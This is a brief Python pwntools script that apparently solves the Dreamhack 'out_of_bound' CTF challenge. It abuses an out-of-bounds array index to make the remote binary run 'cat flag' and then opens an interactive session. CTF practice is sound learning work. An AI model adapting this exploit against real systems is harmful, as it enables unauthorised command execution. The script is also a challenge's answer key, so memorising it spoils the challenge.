from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/out_of_bound')
else:
    r = remote('host1.dreamhack.games', 14171)

name = 0x804a0ac  # var <name>

admin_name = p32(name + 4)
admin_name += b'cat flag'

r.sendafter('Admin name: ', admin_name)
r.sendlineafter('What do you want?: ', '19')

r.interactive()